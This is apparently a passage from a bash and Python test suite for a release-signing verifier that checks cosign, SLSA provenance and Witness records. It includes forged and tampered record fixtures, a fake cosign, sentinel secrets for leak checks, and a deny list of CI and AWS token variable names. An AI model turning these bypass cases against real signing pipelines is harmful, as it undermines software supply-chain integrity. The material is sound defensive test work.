vm = {"publicKey": {"hint": "awskms:///alias/fosterstack-release-signing"}}
if mode == "withcert": vm = {"certificate": {"rawBytes": b64(b"x")}}
if mode == "sslfail": open(w + "/ssl-fail", "w").close()   # the fake openssl fails from now on
env = {"payloadType": pt, "payload": b64(body), "signatures": [{"sig": b64(sig), "keyid": ""}]}
if mode != "notlog":
    # the Rekor entry cosign gets back from the log for a key signature: bound to this payload hash, this signature and the signing key's public half
    pub = open(w + "/" + key + ".pub").read()
    rb = {"apiVersion": "0.0.1", "kind": "dsse", "spec": {"envelopeHash": {"algorithm": "sha256", "value": "0" * 64},
          "payloadHash": {"algorithm": "sha256", "value": __import__("hashlib").sha256(body).hexdigest()},
          "signatures": [{"signature": b64(sig), "verifier": b64(pub.encode())}]}}
    cb = b64(json.dumps(rb, sort_keys=True, separators=(",", ":")).encode())
    log_id = __import__("hashlib").sha256(sh("pkey", "-pubin", "-in", w + "/rekor.pub", "-outform", "DER")).hexdigest()
    canon = json.dumps({"body": cb, "integratedTime": 1761800000, "logID": log_id, "logIndex": 7}, sort_keys=True, separators=(",", ":")).encode()
    open(w + "/fake.set.in", "wb").write(canon)
    vm["tlogEntries"] = [{"logIndex": "7", "integratedTime": "1761800000", "logId": {"keyId": b64(bytes.fromhex(log_id))}, "kindVersion": {"kind": "dsse", "version": "0.0.1"},
                          "canonicalizedBody": cb, "inclusionPromise": {"signedEntryTimestamp": b64(sh("dgst", "-sha256", "-sign", w + "/rekor.key", w + "/fake.set.in"))}}]
bundle = {"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json", "verificationMaterial": vm}
if mode != "nodsse": bundle["dsseEnvelope"] = env
json.dump(bundle, open(out, "w"))
PYF
FAKE
chmod +x "$work/fakebin/cosign"
# sign refuses a GITHUB_SHA that is not 40-hex and a GITHUB_RUN_ID that is not digits, so every case that signs runs with GitHub's own two variables set (the R1a cases below override them)
export GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GITHUB_RUN_ID=424242
PY3=$(command -v python3)
MARK="$work/.start-marker"; : > "$MARK"
: > "$work/cosign-all.log"; SIGNS_OK=0; LEAKS=0
ARGV_RE='^attest-blob --yes --key awskms:///alias/fosterstack-release-signing --signing-config [^ ]+/cosign-signing-config\.json --statement [^ ]+ --bundle [^ ]+/provenance\.bundle\.json$'
SENT_TOK="SENTINEL-TOKEN-$$-7f3a"; SENT_URL="SENTINEL-URL-$$-9c1d"; SENT_CIT="SENTINEL-CIT-$$-2b8e"; SENT_AWS="SENTINEL-AWS-$$-4d6f"
# run ARGS...: the verifier under the network cut; PATH (fake cosign first), OPENSSL and GITHUB_REF are passed THROUGH `env` so
# sudo's env_reset/secure_path (the ubuntu-24.04 fallback) cannot drop them; the fake's argv log is per run and appended to a total
run() { : > "$work/cosign-argv.log"; local rc=0
  "${netcut[@]+"${netcut[@]}"}" env PATH="$work/fakebin:$PATH" OPENSSL="$OPENSSL" GITHUB_REF="${GITHUB_REF:-}" GITHUB_EVENT_NAME="${GITHUB_EVENT_NAME:-}" \
    ${GITHUB_SHA:+GITHUB_SHA=$GITHUB_SHA} ${GITHUB_RUN_ID:+GITHUB_RUN_ID=$GITHUB_RUN_ID} ${GITHUB_SERVER_URL:+GITHUB_SERVER_URL=$GITHUB_SERVER_URL} \
    ${FAKE_BUNDLE:+FAKE_BUNDLE=$FAKE_BUNDLE} ${PYTHONPATH:+PYTHONPATH=$PYTHONPATH} \
    ACTIONS_ID_TOKEN_REQUEST_TOKEN="$SENT_TOK" ACTIONS_ID_TOKEN_REQUEST_URL="https://token.invalid/$SENT_URL" COSIGN_IDENTITY_TOKEN="$SENT_CIT" \
    AWS_SECRET_ACCESS_KEY="$SENT_AWS" \
    "$PY3" "$cv" "$@" 2> "$work/err" > "$work/out" || rc=$?
  if grep -F -q -e "$SENT_TOK" -e "$SENT_URL" -e "$SENT_CIT" -e "$SENT_AWS" "$work/err" "$work/out" "$work/cosign-argv.log" 2> /dev/null; then LEAKS=$((LEAKS + 1)); fi
  cat "$work/cosign-argv.log" >> "$work/cosign-all.log"
  [ "$rc" = 0 ] && [ "${1:-}" = sign ] && SIGNS_OK=$((SIGNS_OK + 1))
  return $rc; }
errlc() { tr 'A-Z' 'a-z' < "$work/err"; }
# a Python crash exits 1 with a traceback: never a refusal
crashed() { grep -F -q "Traceback" "$work/err"; }
expect_ok() { local l=$1; shift; local rc=0; run "$@" || rc=$?
  if [ "$rc" = 0 ]; then ok "$l"; else bad "$l (exit $rc; $(head -c 200 "$work/err" | tr '\n' ' '))"; fi; }
# expect_refuse LABEL "word[|word...]" args...   exit exactly 1, no traceback, the FIRST stderr line is `refused at <stage>: <reason>`
# and every word is in that line; a word that is not the stage name in the prefix must be in the REASON (after the colon), so
# a file name echoed in the prefix, or a stage name, can never stand in for the cause. For a `sign` command the fake cosign
# must also never have been called (the check comes BEFORE the signature).
expect_refuse() { local l=$1 w=$2 x=; shift 2; local rc=0 miss=0 l1 st reason; run "$@" || rc=$?
  l1=$(head -n 1 "$work/err" | tr 'A-Z' 'a-z')
  if grep -E -q '^refused at [a-z]+: .' <<< "$l1"; then
    st=$(printf '%s' "$l1" | sed -E 's/^refused at ([a-z]+): .*/\1/'); reason=${l1#*: }
    reason=${reason//"$(printf '%s' "$work" | tr 'A-Z' 'a-z')"/}   # the random mktemp path can never stand in for (or against) a cause word
    IFS='|' read -r -a ws <<< "$w"
    for x in "${ws[@]}"; do
      case $x in
        '!'*) ! grep -F -q -- "${x#!}" <<< "$reason" || miss=1 ;;          # a word the reason must NOT contain (the other causes)
        *) [ "$x" = "$st" ] || grep -F -q -- "$x" <<< "$reason" || miss=1 ;;
      esac
    done
  else miss=1; fi
  if [ "$rc" = 1 ] && [ "$miss" = 0 ] && ! crashed && { [ "${1:-}" != sign ] || [ ! -s "$work/cosign-argv.log" ]; }; then ok "$l"
  else bad "$l (exit $rc, wanted 1 with first line 'refused at <stage>: ...' and '$w'; fake cosign called: $([ -s "$work/cosign-argv.log" ] && echo YES || echo no); $(head -c 200 "$work/err" | tr '\n' ' '))"; fi; }
mkpol() { run policy make --template "$work/template.json" --tag v0.3.0 --keys-dir "${2:-$work}" --out "$work/$1"; }
V() { echo --policy "$work/policy.json"; }
rec() { echo --record "$work/$1.json"; }
ST() { local cur=$1 prev=$2; shift 2; echo stage-start --stage "$cur" --previous "$prev" --policy "$work/policy.json" "$@"; }

# ---- REQ-CHAIN-002-AC2: the per-tag policy, made from the template and the key manifest -----------------------------
rc=0; mkpol policy.json || rc=$?; mkpol policy-otherkey.json "$work/keys-other" || true; [ "$rc" = 0 ] && ok "002-AC2 policy for v0.3.0 is made from the template and the key manifest" || bad "002-AC2 policy make (exit $rc: $(head -c 200 "$work/err" | tr '\n' ' '))"
python3 - "$work/policy.json" "$work/rel.pub" "$work/rekor.pub" 2> /dev/null <<'PY' && ok "002-AC2 the policy holds the tag, the ref, the repository, the stage names, the release key (key_id = sha256 of its DER) and the pinned Rekor key, and no certificate, timestamp or issuer field" || bad "002-AC2 policy shape"
import hashlib, json, subprocess, sys
p = json.load(open(sys.argv[1])); pub = open(sys.argv[2]).read()
der = subprocess.run(["openssl", "pkey", "-pubin", "-in", sys.argv[2], "-outform", "DER"], capture_output=True, check=True).stdout
assert p == {"tag": "v0.3.0", "ref": "refs/tags/v0.3.0", "repository": "fosterstack/cache", "stages": ["build", "sign", "rebuild", "check", "release"],
             "release_key": {"key_id": hashlib.sha256(der).hexdigest(), "public_key": pub}, "rekor_public_key": open(sys.argv[3]).read()}, p
PY
expect_refuse "002-AC2 a key manifest signed by another root is refused before any policy is written" "manifest|signature" policy make --template "$work/template.json" --tag v0.3.0 --keys-dir "$work/keys-otherroot" --out "$work/policy-bad.json"
[ ! -e "$work/policy-bad.json" ] && ok "002-AC2 a refused manifest leaves no policy file" || bad "002-AC2 a policy file exists after a refused manifest"
expect_ok     "002-AC2 sign provenance made at the policy's ref is accepted as stage sign" verify $(V) --stage sign $(rec sign_prov)
expect_refuse "002-AC2 the provenance of another tag (v0.3.1) is refused: the ref inside it is not the policy's" "ref|refs/tags/v0.3.1" verify $(V) --stage sign $(rec sign_othertag)
expect_refuse "002-AC2 a tag that only starts like the tag (v0.3.0-rc1) is refused" "ref|v0.3.0-rc1" verify $(V) --stage sign $(rec sign_rc)
expect_refuse "002-AC2 a branch is refused" "ref|refs/heads/main" verify $(V) --stage sign $(rec sign_branch)
expect_refuse "002-AC2 round 5 B2a: a BRANCH named like the tag (refs/heads/v0.3.0) is refused (the ref is compared whole, not by its last segment)" "ref|refs/heads/v0.3.0" verify $(V) --stage sign $(rec sign_brtag)
expect_refuse "002-AC2 round 5 B2a: refs/heads/release/v0.3.0 is refused" "ref|refs/heads/release/v0.3.0" verify $(V) --stage sign $(rec sign_brrel)

# ---- the key binds every record: the signature, by the release key of the manifest, over the PAE --------------------
expect_ok     "KEY a Build collection signed by the release key is accepted" verify $(V) --stage build $(rec build_coll)
expect_refuse "KEY provenance signed by a key the manifest does not name is refused" "signature" verify $(V) --stage sign $(rec sign_otherkey)
for s in build rebuild check; do
  expect_refuse "KEY a $s record signed by a key the manifest does not name is refused" "$s|signature" verify $(V) --stage $s $(rec ${s}_coll_otherkey)
  expect_refuse "KEY a $s record signed by the building job's own throwaway key is refused: it is not signed by the manifest key" "$s|signature|manifest key" verify $(V) --stage $s $(rec ${s}_coll_throwaway)
done
expect_refuse "KEY provenance signed by the throwaway key is refused with the same plain reason" "signature|manifest key" verify $(V) --stage sign $(rec sign_throwaway)
expect_refuse "KEY stage-start rebuild <- build refuses a Build record signed by the throwaway key" "build|signature|manifest key" $(ST rebuild build) $(rec build_coll_throwaway) --digests "$work/digests.json"
expect_refuse "KEY tamper: payload changed after signing is refused" "signature" verify $(V) --stage sign $(rec sign_tamper_payload)
expect_refuse "KEY tamper: signature bytes altered is refused" "signature" verify $(V) --stage sign $(rec sign_tamper_sig)
expect_refuse "KEY an unsigned record (no signature at all) is refused" "signature" verify $(V) --stage sign $(rec sign_unsigned)
expect_refuse "KEY a policy made from another manifest refuses a record signed by the real release key" "signature" verify --policy "$work/policy-otherkey.json" --stage sign $(rec sign_prov)
expect_refuse "KEY an old-form record that still carries a certificate is refused, not read as a new one" "envelope|certificate" verify $(V) --stage sign $(rec sign_old_cert)
expect_refuse "KEY an old-form record that still carries intermediates is refused" "envelope|intermediates" verify $(V) --stage sign $(rec sign_old_inter)
expect_refuse "KEY an old-form record that still carries timestamps is refused" "envelope|timestamps" verify $(V) --stage sign $(rec sign_old_stamps)
expect_refuse "KEY a keyid that is not a string is refused" "envelope|keyid" verify $(V) --stage sign $(rec sign_keyid_num)
expect_refuse "KEY a signature entry with a field the form does not have is refused" "envelope|note" verify $(V) --stage sign $(rec sign_extra_field)
expect_ok     "KEY the keyid is never used to find a key: a record whose keyid names another reference is judged by its signature alone" verify $(V) --stage sign --record "$work/sign_prov_keyid_other.json"


# ---- REQ-CHAIN-001-AC4: provenance only as the Sign stage's record, the record type bound to the stage ------------------
expect_ok     "001-AC4 provenance under stage-sign.yml@tag is accepted" verify $(V) --stage sign $(rec sign_prov)
expect_refuse "001-AC4 provenance presented as stage build's record is refused (type is bound to the stage)" "provenance" verify $(V) --stage build $(rec build_as_sign)
for s in rebuild check release; do
  expect_refuse "001-AC4 provenance presented as stage $s's record is refused (type is bound to the stage)" "provenance" verify $(V) --stage $s $(rec ${s}_as_sign)
done
expect_refuse "001-AC4 a Witness collection signed by Sign is refused (Sign signs provenance only)" "predicate" verify $(V) --stage sign $(rec sign_coll)
expect_refuse "001-AC4 SLSA provenance v0.2 is not the allowed type" "predicate" verify $(V) --stage sign $(rec sign_prov_v0.2)
# (Codex #249 r4 B4) the provenance must be a standard SLSA v1 record: a signed, logged statement of the right type whose predicate is {},
# a list, or lacks buildDefinition (+ buildType, externalParameters) or runDetails.builder.id (a non-empty string) is refused at sign
for _c in $(cat "$work/subj-bad.txt"); do
  expect_refuse "001-AC4 a signed, logged provenance whose subject is malformed ($_c) is refused at sign, naming subject" "sign|subject" verify $(V) --stage sign $(rec sign_subj_$_c)
  expect_refuse "001-AC4 a signed Witness collection whose subject is malformed ($_c) is refused at build, naming subject" "build|subject" verify $(V) --stage build $(rec build_subj_$_c)
done
expect_ok "001-AC4 control: a provenance with well-formed subjects (sha256, sha512, sha1) is accepted" verify $(V) --stage sign $(rec sign_subj_ok)
expect_ok "001-AC4 control: a collection whose subject carries a gitoid digest beside sha256 is accepted" verify $(V) --stage build $(rec build_subj_ok)
expect_refuse "001-AC4 a statement _type other than in-toto Statement v0.1 or v1 is refused (pinned)" "predicate|statement type" verify $(V) --stage sign $(rec sign_type_v02)
expect_refuse "001-AC4 a predicateType that is not a string is refused (pinned)" "predicate" verify $(V) --stage sign $(rec sign_ptype_num)
expect_ok "001-AC4 control: the smallest valid SLSA v1 record (buildType, externalParameters {}, builder.id) is accepted" verify $(V) --stage sign $(rec sign_slsa_min)
expect_ok "001-AC4 control: the genuine provenance fixture is accepted" verify $(V) --stage sign $(rec sign_prov)
for _c in $(cat "$work/slsa-bad.txt"); do
  expect_refuse "001-AC4 a signed, logged provenance whose predicate is not SLSA v1 ($_c) is refused at sign" "sign|predicate|slsa v1" verify $(V) --stage sign $(rec sign_$_c)
done
expect_refuse "M5 a Sign record offered as the Release record is refused by its step name: the type is bound to the stage" "predicate|provenance" verify $(V) --stage release $(rec sign_prov)
# ---- REQ-CHAIN-003-AC2: only the standard record types, exact strings ------------------------------------------------
expect_refuse "004-AC8 verify refuses a signed Build record whose environment names ACTIONS_ID_TOKEN_REQUEST_CUSTOM (the whole prefix, not a fixed list)" "build|actions_id_token_request_custom" verify $(V) --stage build $(rec build_env_custom)
expect_refuse "004-AC8 verify refuses a signed Build record whose environment names GH_TOKEN" "build|gh_token" verify $(V) --stage build $(rec build_env_gh)
expect_refuse "004-AC8 verify refuses a signed Build record whose environment names ACTIONS_RUNTIME_URL" "build|actions_runtime_url" verify $(V) --stage build $(rec build_env_runtime)
expect_refuse "007-AC15 verify refuses a signed record whose environment names SIGSTORE_ID_TOKEN (the token release-sign alone holds)" "build|sigstore_id_token" verify $(V) --stage build $(rec build_env_sigstore)
expect_refuse "R2 verify refuses a signed record whose environment names AWS_WEB_IDENTITY_TOKEN_FILE (the token file path of the AWS SDK)" "build|aws_web_identity_token_file" verify $(V) --stage build $(rec build_env_awstokfile)
expect_refuse "R2 verify refuses a signed record whose environment names AWS_ROLE_ARN (both AWS variables are sensitive keys, so no record may hold them)" "build|aws_role_arn" verify $(V) --stage build $(rec build_env_awsrole)
expect_ok "004-AC8 control: a signed Build record with an ordinary environment variable passes verify" verify $(V) --stage build $(rec build_env_clean)
expect_refuse "004-AC8 stage-start refuses the same record as the previous stage's" "build|actions_id_token_request_custom" $(ST rebuild build) $(rec build_env_custom) --digests "$work/digests.json"
expect_ok     "003-AC2 the Witness collection type (Statement v0.1, as Witness writes it) is allowed" verify $(V) --stage build $(rec build_coll)
expect_ok     "003-AC2 the Witness collection type in a Statement v1 is allowed" verify $(V) --stage build $(rec build_coll_v1)
expect_ok     "003-AC2 SLSA provenance v1 is allowed" verify $(V) --stage sign $(rec sign_prov)
expect_ok     "003-AC2 the Witness policy payloadType is allowed (stage release)" verify $(V) --stage release $(rec release_policy)
expect_refuse "003-AC2 an in-toto release Statement is not the signed policy and is refused" "predicate" verify $(V) --stage release $(rec release_stmt_policy)
expect_refuse "003-AC2 the policy type presented by stage build is refused" "predicate|policy" verify $(V) --stage build $(rec build_policy)
for c in madeup ours ours_style v02 plural oldhost slash upper prefix slsa_slash; do
  expect_refuse "003-AC2 near-miss/made-up type '$c' is refused" "predicate" verify $(V) --stage build $(rec build_$c)
done

# ---- REQ-CHAIN-001-AC2: Sign takes Build's digests (a FILE), checked against Build's VERIFIED record ----------------------
# The record binds the digest file by the sha256 of its bytes (the real product subject file:digests.json); the file's CONTENT is
# then judged on its own, so the format cases below are attested by their own collections and equality cannot be what refuses them.
S() { echo sign --check --signer cosign --build-record "$work/${1:-build_coll}.json" --policy "$work/policy.json" --now "${2:-$NOW}" --out "$work/out-$RANDOM$RANDOM$RANDOM"; }
expect_ok     "001-AC2 a digest file whose bytes Build's record attests is accepted (and signed)" $(S) --digests "$work/digests.json"
for c in other:"a digest that differs" extra:"an extra entry" subset:"a missing entry" swapped:"two names with their values swapped"; do
  expect_refuse "001-AC2 ${c#*:} (other bytes than Build attested) is refused" "digest|!signature|!identity|!timestamp" $(S) --digests "$work/digests-${c%%:*}.json"
done
expect_refuse "001-AC2 Build's record for a different file than the one given (extra entries attested) is refused" "digest" $(S build_coll_plus) --digests "$work/digests.json"
expect_refuse "001-AC2 Build's record for the swapped file is refused against the real list" "digest" $(S build_coll_swapped) --digests "$work/digests.json"
for v in wrongname:"file:digests.json carries the wrong hash while file:other carries the right one" dup:"two subjects named file:digests.json (wrong first)" dup2:"two subjects named file:digests.json (right first)" \
         bak:"the right hash under file:digests.json.bak (a prefix/substring match)" xname:"the right hash under file:xdigests.json (a suffix match)" \
         evilhost:"the right hash under https://evil.example/.../file:digests.json (a basename match)" material:"the right hash under .../material/v0.1/file:digests.json (a wrong attestor kind)" \
         gitoidonly:"file:digests.json with a gitoid digest and no sha256 key"; do
  expect_refuse "001-AC2 the subject is bound by NAME: ${v#*:}" "digest" $(S build_coll_${v%%:*}) --digests "$work/digests.json"
done
for c in sha512:"a sha512 value" 63:"63 hex characters" upper:"upper-case hex" null:"a null value" number:"a number" path:"a path instead of a digest" \
         code:"code in a value" badval:"a non-hex value" codename:"code in a name" uppername:"an upper-case name" slashname:"a slash in a name" \
         dotdotname:"a .. name" dupkey:"a duplicate JSON key" notobject:"a JSON array instead of an object" \
         hex65:"65 hex characters (an unanchored end)" newline:"a trailing newline after the hex" prefixed:"a path prefix before sha256: (search instead of match)" \
         emptyname:"an empty name" underscorename:"a name of one underscore" emptyobj:"an empty object (a provenance with zero subjects)" \
         newlinename:"a trailing newline after a name" unicodename:"a non-ASCII letter in a name (\\w instead of [a-z])" unicodehex:"Arabic-Indic digits as hex (\\d instead of [0-9])" \
         fullwidthhex:"full-width letters as hex"; do
  expect_refuse "001-AC2 Build attests the file AS IT IS and the content is still refused: ${c#*:}" "format" $(S build_coll_${c%%:*}) --digests "$work/digests-${c%%:*}.json"
done
expect_refuse "001-AC2 Build's record unsigned is refused before the digests are read" "build|signature" $(S build_coll_unsigned) --digests "$work/digests.json"
expect_refuse "001-AC2 Build's record tampered after signing (the file hash still equal) is refused" "build|signature" $(S build_coll_tampered) --digests "$work/digests.json"
expect_refuse "001-AC2 Build's record of another type (made up) is refused" "build|predicate" $(S build_madeup) --digests "$work/digests.json"
expect_refuse "001-AC2 Build's record presented as the signed policy type is refused" "build|predicate|policy" $(S build_policy) --digests "$work/digests.json"
# the sign side (rule 52: Sign WRITES the provenance only after the check passes), with a fake cosign on PATH
mkdir -p "$work/sd"
rc=0; run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/ok" || rc=$?
if [ -f "$work/cosign-argv.log" ] && grep -E -q "$ARGV_RE" "$work/cosign-argv.log" \
   && ! grep -E -q -- '--identity-token|--sk|--output-key|--use-signing-config|--fulcio|--rekor|--tlog-upload|--insecure|arn:aws' "$work/cosign-argv.log"; then
  ok "001-AC3 sign runs exactly 'cosign attest-blob --yes --key awskms:///alias/fosterstack-release-signing --signing-config <committed config> --statement S --bundle DIR/provenance.bundle.json', with no token, endpoint or ARN"
else bad "001-AC3 the cosign invocation is not the pinned one ($(tr '\n' ' ' < "$work/cosign-argv.log" 2> /dev/null | head -c 200))"; fi
python3 - "$root" 2> /dev/null <<'PY' && ok "P5 the committed cosign-signing-config.json names no certificate authority, OIDC issuer, Rekor log or timestamp authority" || bad "P5 the committed signing config names a service, or is missing"
import json, sys
c = json.load(open(sys.argv[1] + "/.github/policy/cosign-signing-config.json"))
for k in ("caUrls", "oidcUrls", "tsaUrls"): assert c.get(k) == [], k
assert len(c.get("rekorTlogUrls", [])) == 1, "rekorTlogUrls"
PY
python3 - "$work/sd/ok" "$work/digests.json" <<'PY' 2> /dev/null && ok "001-AC2 sign writes SLSA provenance v1 whose subjects equal the digest list (names and values)" || bad "001-AC2 the provenance written by sign is missing or wrong"
import base64, json, os, sys
d, df = sys.argv[1], json.load(open(sys.argv[2]))
env = json.load(open(os.path.join(d, "provenance.json")))
st = json.loads(base64.b64decode(env["payload"]))
assert st["_type"] == "https://in-toto.io/Statement/v1" and st["predicateType"] == "https://slsa.dev/provenance/v1", st
assert {s["name"]: "sha256:" + s["digest"]["sha256"] for s in st["subject"]} == df and len(st["subject"]) == len(df)
assert env["signatures"] and env["payloadType"] == "application/vnd.in-toto+json"
# a real SLSA v1 predicate, not {}: buildDefinition and runDetails.builder.id (the Sign workflow identity)
pr = st["predicate"]; assert pr.get("buildDefinition") and pr["runDetails"]["builder"]["id"].endswith("/.github/workflows/stage-sign.yml@refs/tags/v0.3.0"), pr
PY
# rc-2 R1a (Fable R1 part a): `sign` writes GITHUB_SHA and GITHUB_RUN_ID into the signed provenance, so it refuses what is not a 40-hex commit or a run number, naming which, before cosign is asked
SGN() { echo sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/$1"; }
GITHUB_SHA="" GITHUB_RUN_ID=424242 expect_refuse "R1a an empty GITHUB_SHA is refused by sign, naming it" "github_sha" $(SGN r1a-empty)
[ ! -e "$work/sd/r1a-empty" ] && ok "R1a r1a-empty: no output folder was made" || bad "R1a r1a-empty: an output folder exists"
GITHUB_SHA=0123456789abcdef GITHUB_RUN_ID=424242 expect_refuse "R1a a short GITHUB_SHA is refused by sign, naming it" "github_sha" $(SGN r1a-short)
[ ! -e "$work/sd/r1a-short" ] && ok "R1a r1a-short: no output folder was made" || bad "R1a r1a-short: an output folder exists"
GITHUB_SHA=0123456789ABCDEF0123456789ABCDEF01234567 GITHUB_RUN_ID=424242 expect_refuse "R1a an upper-case GITHUB_SHA is refused by sign, naming it" "github_sha" $(SGN r1a-upper)
[ ! -e "$work/sd/r1a-upper" ] && ok "R1a r1a-upper: no output folder was made" || bad "R1a r1a-upper: an output folder exists"
GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GITHUB_RUN_ID="" expect_refuse "R1a an empty GITHUB_RUN_ID is refused by sign, naming it" "github_run_id" $(SGN r1a-noid)
[ ! -e "$work/sd/r1a-noid" ] && ok "R1a r1a-noid: no output folder was made" || bad "R1a r1a-noid: an output folder exists"
GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GITHUB_RUN_ID=42a expect_refuse "R1a a GITHUB_RUN_ID that is not digits is refused by sign, naming it" "github_run_id" $(SGN r1a-badid)
[ ! -e "$work/sd/r1a-badid" ] && ok "R1a r1a-badid: no output folder was made" || bad "R1a r1a-badid: an output folder exists"
# the provenance says what was built from which source in which run (SLSA v1 buildDefinition / runDetails), from GitHub's own variables
GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GITHUB_RUN_ID=424242 run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/meta" || true
python3 - "$work/sd/meta" <<'PY' 2> /dev/null && ok "001-AC2 the provenance names the source commit and the run (resolvedDependencies gitCommit, invocationId = the run URL) and the Sign workflow as builder" || bad "001-AC2 the provenance lacks the commit or the run"
import base64, json, os, sys
st = json.loads(base64.b64decode(json.load(open(os.path.join(sys.argv[1], "provenance.json")))["payload"]))
pr = st["predicate"]
dep = pr["buildDefinition"]["resolvedDependencies"]
assert dep and dep[0]["digest"]["gitCommit"] == "0123456789abcdef0123456789abcdef01234567", dep
assert pr["runDetails"]["metadata"]["invocationId"].endswith("/fosterstack/cache/actions/runs/424242"), pr["runDetails"]
assert pr["buildDefinition"]["externalParameters"]["workflow"].endswith("/.github/workflows/release.yml@refs/tags/v0.3.0"), pr["buildDefinition"]
PY
python3 - "$work/sd/ok" <<'PY' 2> /dev/null && ok "001-AC3 nothing Sign leaves in its output folder is key material (no PRIVATE KEY text, no .key/.pem/.p12 file)" || bad "001-AC3 key material, or no output folder, in what sign wrote"
import os, re, sys
n = 0
for dp, _, fs in os.walk(sys.argv[1]):
    for f in fs:
        n += 1
        assert not re.search(r"\.(key|pem|p12|pfx|jks)$", f, re.I), f
        assert b"PRIVATE KEY" not in open(os.path.join(dp, f), "rb").read(), f
assert n >= 1, "nothing was written"
PY
expect_ok     "001-AC4 the provenance Sign itself wrote verifies as stage sign (the bundle shape and the verify shape agree)" verify $(V) --stage sign --record "$work/sd/ok/provenance.json"
expect_ok     "001-AC5 positive-control shape: verify --stage sign --record <Sign's output> --policy P is accepted" verify --stage sign --record "$work/sd/ok/provenance.json" --policy "$work/policy.json"
expect_ok     "003-AC1 and release <- sign accepts Sign's own output for exactly the digests it signed" $(ST release sign) --record "$work/sd/ok/provenance.json" --digests "$work/digests.json"
rc=0; run sign --check --signer cosign --build-record "$work/build_coll_tampered.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/bad" || rc=$?
if [ "$rc" = 1 ] && [ -z "$(ls -A "$work/sd/bad" 2> /dev/null)" ] && [ ! -s "$work/cosign-argv.log" ]; then ok "001-AC2 a failed check writes NOTHING to the output folder and never calls cosign"; else bad "001-AC2 a failed check left output or called cosign (exit $rc)"; fi
rc=0; run sign --check --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests-other.json" --out "$work/sd/bad2" || rc=$?
if [ "$rc" = 1 ] && [ -z "$(ls -A "$work/sd/bad2" 2> /dev/null)" ] && [ ! -s "$work/cosign-argv.log" ]; then ok "001-AC2 replay: provenance is not written, and cosign is not called, for digests Build did not attest"; else bad "001-AC2 replay with other digests wrote output (exit $rc)"; fi
rc=0; run sign --signer cosign --build-record "$work/build_coll.json" --policy "$work/policy.json" --digests "$work/digests.json" --out "$work/sd/nocheck" || rc=$?
if [ "$rc" = 1 ] && ! crashed && [ -z "$(ls -A "$work/sd/nocheck" 2> /dev/null)" ] && [ ! -s "$work/cosign-argv.log" ]; then ok "001-AC2 sign without --check is not a mode: it refuses, calls no cosign and writes nothing"; else bad "001-AC2 sign without --check wrote output (exit $rc)"; fi
# the Sign job passes the committed TEMPLATE as --policy: sign --check makes the per-tag policy itself (rule 57) from the template,
# the committed trust file and PEMs (defaults next to the template, overridable by flags) and the tag from GITHUB_REF
TP() { echo sign --check --signer cosign --build-record "$work/build_coll.json" --template "$work/template.json" \
  --now "$NOW" --digests "$work/digests.json" --out "$work/sd/$1"; }
GITHUB_REF=refs/tags/v0.3.0 GITHUB_EVENT_NAME=push expect_ok "001-AC2 --policy the template + GITHUB_REF=refs/tags/v0.3.0: the per-tag policy is made and Build's record verifies" $(TP tpl1)
GITHUB_REF=refs/heads/main GITHUB_EVENT_NAME=push expect_refuse "001-AC2 template mode on a branch (GITHUB_REF is not a tag) is refused" "tag|github_ref" $(TP tpl2)
GITHUB_REF= GITHUB_EVENT_NAME=push expect_refuse "001-AC2 template mode with no GITHUB_REF is refused" "tag|github_ref" $(TP tpl4)

# ---- production vs dry run (round 5): the ref shapes, the dry-run mode, and Release's tag-pinned refusal of any branch record ----------
TPR() { echo sign --check --signer cosign --build-record "$work/$1.json" --template "$work/template.json" \
  --now "$NOW" --digests "$work/digests.json" --out "$work/sd/$2"; }
CBR() { echo check-build-record --build-record "$work/$1.json" --template "$work/template.json" --now "$NOW" --digests "$work/digests.json"; }
for t in v0.3.0-RC1 v0.3.0-rc v0.3.0-rc1x v0.3.0-rc.1 v0.3.0rc1 v0.3.0-rc1-rc1 v0.3.0-1rc1 v0.3.0-rc-1 v0.3-rc1; do
  GITHUB_REF=refs/tags/$t GITHUB_EVENT_NAME=push expect_refuse "001-AC2/rc: the near-miss ref $t is not a tag of the grammar and is refused by Sign" "tag" $(TPR build_coll tagnm)
  expect_refuse "002-AC2/rc: policy make --tag $t is refused" "tag" policy make --template "$work/template.json" --tag "$t" --out "$work/policy-bad.json"
  expect_refuse "002-AC2/rc: policy make --ref refs/tags/$t is refused" "tag" policy make --template "$work/template.json" --ref "refs/tags/$t" --out "$work/policy-bad.json"
done
rc=0; run policy make --template "$work/template.json" --tag v0.3.0-rc1 --out "$work/policy-rc.json" || rc=$?
[ "$rc" = 0 ] && python3 -c 'import json,sys; p=json.load(open(sys.argv[1])); sys.exit(0 if p["tag"]=="v0.3.0-rc1" and p["ref"]=="refs/tags/v0.3.0-rc1" and not p.get("dry_run") and p["stages"]==["build","sign","rebuild","check","release"] and len(p["release_key"]["key_id"])==64 else 1)' "$work/policy-rc.json" && ok "002-AC2/rc: policy make --tag v0.3.0-rc1 carries the FULL tag and ref, the five stages and the release key" || bad "002-AC2/rc: policy for v0.3.0-rc1 (exit $rc)"
rc=0; run policy make --template "$work/template.json" --ref refs/tags/v0.3.0-rc1 --out "$work/policy-rc-ref.json" || rc=$?
[ "$rc" = 0 ] && cmp -s "$work/policy-rc.json" "$work/policy-rc-ref.json" && ok "002-AC2/rc: policy make --ref refs/tags/v0.3.0-rc1 is the same policy as --tag v0.3.0-rc1" || bad "002-AC2/rc: --ref rc differs from --tag rc (exit $rc)"
expect_refuse "002-AC2/rc: the snapshot version in the rc grammar (v0.0.0-rc1) has no policy" "snapshot" policy make --template "$work/template.json" --tag v0.0.0-rc1 --out "$work/policy-bad.json"
GITHUB_REF=refs/tags/x GITHUB_EVENT_NAME=push expect_refuse "001-AC2 production: refs/tags/x is refused" "tag" $(TPR build_coll tagx)
GITHUB_REF=refs/heads/x GITHUB_EVENT_NAME=push expect_refuse "001-AC2 production: a branch on a push event is refused" "tag" $(TPR build_coll branchx)
